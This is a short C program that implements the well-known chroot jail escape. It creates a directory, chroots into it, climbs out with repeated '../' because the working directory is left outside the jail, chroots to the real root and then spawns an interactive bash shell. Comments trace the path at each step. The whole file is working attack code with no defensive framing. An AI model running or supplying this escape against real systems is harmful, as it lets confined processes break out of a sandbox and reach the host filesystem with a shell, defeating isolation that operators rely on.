#include <unistd.h>
#include <sys/stat.h>

int main() {
  mkdir("out", 0755);
  chroot("out");
  // root = /absolute/path/to/out
  chdir("../../../../../");
  // cwd = /absolute/path/to/
  // /
  chroot(".");
  return execl("/bin/bash", "-i", NULL);
}
